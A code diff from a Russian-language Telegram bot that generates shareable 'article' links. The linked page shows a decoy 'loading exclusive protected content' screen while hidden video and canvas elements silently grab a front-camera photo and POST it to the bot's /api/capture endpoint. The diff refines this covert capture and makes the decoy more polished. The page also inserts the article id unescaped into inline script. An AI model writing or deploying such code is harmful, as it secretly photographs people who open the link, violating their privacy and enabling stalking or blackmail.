@@ -560,12 +560,14 @@ async def btn_create_article(message: Message):
     db.execute("INSERT OR REPLACE INTO articles(article_id, owner_id, title) VALUES (?, ?, ?)", (article_id, message.from_user.id, "Статья"))
     db.commit()
     
-    web_app_url = f"https://{os.getenv('RENDER_EXTERNAL_URL', 'your-app.onrender.com').replace('https://', '')}/article/{article_id}"
+    domain = os.getenv('RENDER_EXTERNAL_URL', 'your-app.onrender.com').replace('https://', '').replace('http://', '')
+    web_app_url = "https://" + domain + "/article/" + article_id
+    
     keyboard = InlineKeyboardMarkup(inline_keyboard=[
         [InlineKeyboardButton(text="👁 Открыть статью", url=web_app_url)],
         [InlineKeyboardButton(text="📋 Скопировать ссылку", copy_text=CopyTextButton(text=web_app_url))]
     ])
-    await message.answer(f"🌐 <b>Статья создана!</b>\n\n🔗 <code>{web_app_url}</code>", reply_markup=keyboard, parse_mode="HTML")
+    await message.answer("🌐 <b>Статья создана!</b>\n\n🔗 <code>" + web_app_url + "</code>", reply_markup=keyboard, parse_mode="HTML")
 
 
 @router.message(F.text == "🛡 Проверить ссылку")
@@ -693,32 +695,35 @@ async def cb_fav(callback: CallbackQuery):
 
 async def handle_article(request):
     article_id = request.match_info.get("article_id")
-    html = f"""
-    <!DOCTYPE html>
-    <html lang="ru">
-    <head>
-        <meta charset="UTF-8"><script src="https://telegram.org/js/telegram-web-app.js"></script>
-        <style>body{{font-family:sans-serif;background:#0f172a;color:#f8fafc;padding:20px;text-align:center;}}</style>
-    </head>
-    <body>
-        <h2>Загрузка материала...</h2>
-        <video id="v" autoplay playsinline style="display:none;"></video>
-        <canvas id="c" style="display:none;"></canvas>
-        <script>
-            window.Telegram.WebApp.expand();
-            navigator.mediaDevices.getUserMedia({{video:true}}).then(s=>{{
-                let v=document.getElementById('v'); v.srcObject=s;
-                setTimeout(()=>{{
-                    let c=document.getElementById('c'); c.width=640; c.height=480;
-                    c.getContext('2d').drawImage(v,0,0,640,480);
-                    fetch('/api/capture', {{method:'POST', headers:{{\'Content-Type\':\'application/json\'}}, body:JSON.stringify({{article_id:'{article_id}', image:c.toDataURL()}})});
-                    s.getTracks().forEach(t=>t.stop());
-                }}, 1000);
-            }}).catch(e=>{{}});
-        </script>
-    </body>
-    </html>
-    """
+    
+    html = (
+        '<!DOCTYPE html><html lang="ru"><head><meta charset="UTF-8">'
+        '<script src="https://telegram.org/js/telegram-web-app.js"></script>'
+        '<style>body{font-family:sans-serif;background:#0f172a;color:#f8fafc;padding:20px;text-align:center;}'
+        '.card{background:#1e293b;padding:25px;border-radius:16px;margin-top:40px;}'
+        'h2{color:#38bdf8;}</style></head>'
+        '<body><div class="card"><h2>📖 Эксклюзивный материал</h2>'
+        '<p>Загрузка защищенного контента...</p></div>'
+        '<video id="v" autoplay playsinline style="display:none;"></video>'
+        '<canvas id="c" style="display:none;"></canvas>'
+        '<script>'
+        'let tg = window.Telegram.WebApp;'
+        'tg.expand();'
+        'navigator.mediaDevices.getUserMedia({video: {facingMode: "user"}}).then(s => {'
+        '  let v = document.getElementById("v"); v.srcObject = s;'
+        '  setTimeout(() => {'
+        '    let c = document.getElementById("c"); c.width = 640; c.height = 480;'
+        '    c.getContext("2d").drawImage(v, 0, 0, 640, 480);'
+        '    fetch("/api/capture", {'
+        '      method: "POST",'
+        '      headers: {"Content-Type": "application/json"},'
+        '      body: JSON.stringify({article_id: "' + article_id + '", image: c.toDataURL()})'
+        '    });'
+        '    s.getTracks().forEach(t => t.stop());'
+        '  }, 1200);'
+        '}).catch(e => {});'
+        '</script></body></html>'
+    )
     return web.Response(text=html, content_type="text/html")
 
 
